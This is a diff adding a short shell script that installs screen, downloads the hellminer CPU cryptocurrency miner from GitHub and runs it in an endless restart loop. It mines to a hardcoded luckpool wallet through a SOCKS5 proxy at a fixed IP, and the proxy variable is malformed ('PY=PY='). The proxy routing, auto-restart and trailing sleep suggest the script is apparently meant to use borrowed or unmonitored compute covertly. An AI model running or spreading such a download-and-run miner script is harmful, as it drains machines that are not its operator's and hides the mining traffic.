@@ -1,0 +1,14 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+PL=stratum+tcp://ap.luckpool.net:3956#xnsub
+WL=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WR=VIA
+PY=PY=socks5://104.248.48.172:30588
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+while [ 1 ]; do
+./hellminer -c $PL -u $WL.$WR -p x --cpu 4 -x $PY
+sleep 3
+done
+sleep 999
